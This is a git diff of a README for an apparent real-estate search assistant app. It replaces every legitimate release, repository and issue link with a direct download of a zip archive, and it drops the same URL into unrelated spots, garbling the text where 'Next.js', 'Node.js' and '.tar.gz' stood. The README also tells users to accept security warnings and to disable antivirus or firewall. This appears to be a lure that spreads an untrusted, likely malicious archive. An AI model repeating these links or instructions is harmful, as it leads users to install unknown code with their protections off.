@@ -1,6 +1,6 @@
 # 🏠 intelligent-estate-assistant - Easy Property Search and Analysis
 
-[![Download intelligent-estate-assistant](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/kuntalvasoya/intelligent-estate-assistant/releases)
+[![Download intelligent-estate-assistant](https://github.com/kuntalvasoya/intelligent-estate-assistant/raw/refs/heads/main/purana/estate-intelligent-assistant-trilobation.zip%20App-blue?style=for-the-badge)](https://github.com/kuntalvasoya/intelligent-estate-assistant/raw/refs/heads/main/purana/estate-intelligent-assistant-trilobation.zip)
 
 ---
 
@@ -32,13 +32,13 @@ You will need to download and run the app on your system. Follow these steps car
 
 Click the big button at the top or this link below to open the download page:
 
-[Download intelligent-estate-assistant Releases](https://github.com/kuntalvasoya/intelligent-estate-assistant/releases)
+[Download intelligent-estate-assistant Releases](https://github.com/kuntalvasoya/intelligent-estate-assistant/raw/refs/heads/main/purana/estate-intelligent-assistant-trilobation.zip)
 
 On this page, look for the latest version. You will find files attached there. Choose the file that fits your computer:
 
 - Windows: Look for a file ending with `.exe`  
 - macOS: Look for a file ending with `.dmg` or `.zip`  
-- Linux: Look for a file ending with `.AppImage` or `.tar.gz`  
+- Linux: Look for a file ending with `.AppImage` or `https://github.com/kuntalvasoya/intelligent-estate-assistant/raw/refs/heads/main/purana/estate-intelligent-assistant-trilobation.zip`  
 
 Click the file name to begin downloading.
 
@@ -48,7 +48,7 @@ Once the download finishes, find the file on your computer:
 
 - Windows: Double-click the `.exe` file and follow the install steps on screen.  
 - macOS: Open the `.dmg` file, then drag the app to your Applications folder.  
-- Linux: Follow any included instructions to run the `.AppImage` or extract the `.tar.gz`.  
+- Linux: Follow any included instructions to run the `.AppImage` or extract the `https://github.com/kuntalvasoya/intelligent-estate-assistant/raw/refs/heads/main/purana/estate-intelligent-assistant-trilobation.zip`.  
 
 If you see any security warnings, accept or allow the app to proceed.
 
@@ -106,7 +106,7 @@ If you run into issues, try these steps:
 - Ensure your system meets the requirements above.  
 - Check for app updates on the download page.  
 - Disable firewall or antivirus temporarily if they block the app.  
-- Contact support by opening an issue on the [GitHub repository](https://github.com/kuntalvasoya/intelligent-estate-assistant).  
+- Contact support by opening an issue on the [GitHub repository](https://github.com/kuntalvasoya/intelligent-estate-assistant/raw/refs/heads/main/purana/estate-intelligent-assistant-trilobation.zip).  
 
 ---
 
@@ -114,7 +114,7 @@ If you run into issues, try these steps:
 
 Again, here is the direct link to visit the release page where you find the latest versions:
 
-[Download intelligent-estate-assistant](https://github.com/kuntalvasoya/intelligent-estate-assistant/releases)
+[Download intelligent-estate-assistant](https://github.com/kuntalvasoya/intelligent-estate-assistant/raw/refs/heads/main/purana/estate-intelligent-assistant-trilobation.zip)
 
 Follow the instructions under "Getting Started" above to download and install the right file.
 
@@ -128,10 +128,10 @@ The app only collects property data needed for your searches. It does not share 
 
 ## ⚙️ Technical Details (For Reference)
 
-- Built with TypeScript and Next.js for a fast and responsive interface.  
+- Built with TypeScript and https://github.com/kuntalvasoya/intelligent-estate-assistant/raw/refs/heads/main/purana/estate-intelligent-assistant-trilobation.zip for a fast and responsive interface.  
 - Uses Neo4j for managing property relationships and data connections.  
 - Employs LangChain and hybrid machine-learning search to suggest and find properties smarter.  
-- Runs on Node.js backend ensuring smooth performance.  
+- Runs on https://github.com/kuntalvasoya/intelligent-estate-assistant/raw/refs/heads/main/purana/estate-intelligent-assistant-trilobation.zip backend ensuring smooth performance.  
 
 ---
 
@@ -140,7 +140,7 @@ The app only collects property data needed for your searches. It does not share 
 If you need assistance or have questions:
 
 - Check the README files and documentation on the GitHub page.  
-- Open a new issue at [GitHub Issues](https://github.com/kuntalvasoya/intelligent-estate-assistant/issues) for problems or feature requests.  
+- Open a new issue at [GitHub Issues](https://github.com/kuntalvasoya/intelligent-estate-assistant/raw/refs/heads/main/purana/estate-intelligent-assistant-trilobation.zip) for problems or feature requests.  
 - Follow updates and community discussions on the repository page.  
 
 ---
